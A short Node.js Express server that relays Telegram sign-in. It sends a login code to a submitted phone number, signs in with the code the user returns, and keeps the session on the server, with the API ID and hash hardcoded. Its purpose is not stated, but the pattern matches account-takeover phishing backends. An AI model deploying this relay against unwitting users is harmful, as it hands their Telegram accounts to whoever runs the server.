const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const input = require('input');

const apiId = 18148868;
const apiHash = 'f3952fb78d7ea8932d3c02386b347051';

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

let client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });

app.post('/send-otp', async (req, res) => {
    const phone = req.body.phone;
    try {
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash, phoneNumber: phone });
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (error) {
        console.error(error);
        res.json({ success: false, error: error.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code, phoneCodeHash } = req.body;
    try {
        await client.signIn({ phoneNumber: phone, phoneCodeHash, phoneCode: code });
        res.json({ success: true, message: 'OTP verified successfully' });
    } catch (error) {
        console.error(error);
        res.json({ success: false, error: error.message });
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
